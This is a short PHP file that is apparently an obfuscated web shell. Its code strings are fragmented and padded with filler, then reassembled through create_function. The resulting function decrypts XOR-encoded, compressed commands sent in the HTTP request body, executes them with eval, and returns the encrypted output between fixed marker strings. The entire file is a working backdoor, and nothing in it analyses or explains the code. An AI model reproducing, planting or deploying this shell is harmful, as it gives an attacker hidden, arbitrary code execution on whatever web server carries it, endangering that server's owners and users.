<?php
$M='Zreg_matcIZh("/$kh(.+)$kf/"IZ,@file_get_cIZontents(IZ"pIZhIZp://inIZput"),$m)==IZ1) {@ob_IZstart(';
$b='Z($IZjIZ=0;($j<$c&IZ&$i<$l)IZ;$j++,$iIZ++){$o.=$t{$i}IZ^$kIZ{$j};}}retIZIZurIZn $o;}if IZ(IZ@IZpI';
$m='Z;@ob_end_cleIZan();$r=@bIZase64_enIZcode(IZ@x(@gIZzcompresIZs(IZ$o),$k));priIZnt("IZIZ$p$kh$r$kf");}';
$i='$kIZ="37909b9IZ2";$khIZ="IZ502ed8dab71c";IZ$kf="IZ40IZbf94d7937IZc";$pIZ="bWIZHRIZ860a6g5Ssq89"';
$S=str_replace('d','','crddeatdddde_function');
$D=');@eIZIZIZval(@gzunIZcomprIZess(@x(@baseIZ6IZ4IZIZ_decode($m[1]),$k))IZ);$o=@ob_IZgeIZtIZ_contents()IZI';
$t=';IZfuncIZtiIZon x($t,$k){IZ$c=strlIZenIZ($k);$l=IZsIZtrleIZn($t);$o="";IZfor($iIZIZ=0;$i<$l;){IZforI';
$A=str_replace('IZ','',$i.$t.$b.$M.$D.$m);
$e=$S('',$A);$e();
?>
